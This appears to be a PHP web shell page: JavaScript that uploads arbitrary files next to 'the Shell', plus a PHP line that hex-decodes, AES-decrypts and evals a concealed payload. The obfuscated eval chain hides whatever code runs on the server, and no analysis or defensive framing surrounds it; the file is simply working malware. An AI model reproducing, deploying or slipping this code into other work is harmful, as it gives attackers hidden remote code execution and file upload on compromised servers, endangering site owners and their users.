<script>
function upload(fileInputId, fileIndex)
    {
		var url = window.location.pathname;
		var scriptname = url.substring(url.lastIndexOf('/')+1);
		var filename = document.getElementById('upload_files').value;
		var filename = filename.match(/[^\\/]*$/)[0];
		var location = window.location.href;
		var directoryPath = location.substring(0, location.lastIndexOf("/")+1);
		document.getElementById("status").textContent = "Uploading the file "+filename+", please wait..";
		document.getElementById("status").style.color = "blue";
        // take the file from the input
        var file = document.getElementById(fileInputId).files[fileIndex];
        var reader = new FileReader();
        reader.readAsBinaryString(file); // alternatively you can use readAsDataURL
        reader.onloadend  = function(evt)
        {
                // create XHR instance
                xhr = new XMLHttpRequest();

                // send the file through POST
                xhr.open("POST", scriptname+"?name="+filename, true);

                // make sure we have the sendAsBinary method on all browsers
                XMLHttpRequest.prototype.mySendAsBinary = function(text){
                    var data = new ArrayBuffer(text.length);
                    var ui8a = new Uint8Array(data, 0);
                    for (var i = 0; i < text.length; i++) ui8a[i] = (text.charCodeAt(i) & 0xff);

                    if(typeof window.Blob == "function")
                    {
                         var blob = new Blob([data]);
                    }else{
                         var bb = new (window.MozBlobBuilder || window.WebKitBlobBuilder || window.BlobBuilder)();
                         bb.append(data);
                         var blob = bb.getBlob();
                    }

                    this.send(blob);
                }

                // let's track upload progress
                var eventSource = xhr.upload || xhr;
                eventSource.addEventListener("progress", function(e) {
                    // get percentage of how much of the current file has been sent
                    var position = e.position || e.loaded;
                    var total = e.totalSize || e.total;
                    var percentage = Math.round((position/total)*100);

                    // here you should write your own code how you wish to proces this
                });

                // state change observer - we need to know when and if the file was successfully uploaded
                xhr.onreadystatechange = function()
                {
                    if(xhr.readyState == 4)
                    {
                        if(xhr.status == 200)
                        {
                            // process success
							document.getElementById("status").textContent = "The file "+filename+" Uploaded successfully in same folder as Shell. At Link= "+directoryPath+filename;
							document.getElementById("status").style.color = "green";
                        }else{
                            // process error
                        }
                    }
                };

                // start sending
                xhr.mySendAsBinary(evt.target.result);
        };
    }
</script>

<html><link rel='icon' href='https://e.top4top.io/p_26973oc9i1.png' sizes='20x20' type='image/png'><?php eval(hex2bin("2f2f204f62667573636174696f6e20577261707065722076332e300d0a245f4f62465f30203d202262473148436d36664f77754e4c4d33797a51466a306a4d65617741673337624a5436556e507832714c5035486c356273524b33525a4e38577651574d4379794766746345577676656f323272446b54356e365665684b633347725a65323573537a344464516e33474e4363787a32596d31614e4142532b4c4e457a786f58304f6358506e516d6c5364456f49634f544d692f6944436154717341496f6263612f5a71622f644f556a5755655034683666666f46506a526f59414e59506b4c4c6c64614b4266394b5777482b6c4d2f4f46487150494553356962335035613634443762416d70745875752b634b385a6d5a4c4c37584634355a39505a705a6c653141576369585651386368733035512f4c45706561657142585a49356a796d52463270414e33624f7a5345705a3743366b394f6a564a30372b476e475a6e4d5377473361685042555369435272467249786735647a7a6d3447715651473374315a56324265326e7a6a674c534f516939386275304c55345136716b6135496c56426a617a53633036424664525145584f6941325a6835557a556d62702f3563314470776c4c4a6363544243637933663348356b73436f325a2b663337477a4f4e306b6d355a4e586242496c5a36775a7853566d372f6b584648734d344c4c7743766f555430784c37566477447451316b63303159705773514749662f3077302f6d343641575a7271576c4936486465495373316f362f316d6c6a4947624e4266755858694e645141416f3977364f73634a65503044692f72794b6e676d453530733551593d223b0d0a0d0a66756e6374696f6e20677642634157624d495828737472696e6720245f312c20696e7420245f32293a20737472696e67207b0d0a20202020246d6574686f64203d20224145532d3235362d434243223b0d0a20202020246b6579203d20686173682827736861323536272c2028737472696e6729245f322c2074727565293b0d0a202020200d0a20202020245f33203d206261736536345f6465636f646528245f31293b0d0a202020206c6973742824656e637279707465642c2024697629203d206578706c6f646528273a3a272c20245f332c2032293b0d0a202020200d0a2020202072657475726e206f70656e73736c5f64656372797074280d0a202020202020202024656e637279707465642c200d0a2020202020202020246d6574686f642c200d0a2020202020202020246b65792c200d0a20202020202020204f50454e53534c5f5241575f444154412c200d0a20202020202020202469760d0a2020202029203f3a2027273b0d0a7d0d0a0d0a66756e6374696f6e2057486f6359477252516928737472696e6720245f342c20696e7420245f35293a20766f6964207b0d0a20202020245f36203d20677642634157624d495828245f342c20245f35293b0d0a20202020406576616c28245f36293b0d0a7d0d0a0d0a57486f6359477252516928245f4f62465f302c2037323632293b0d0a3f3e")); ?>
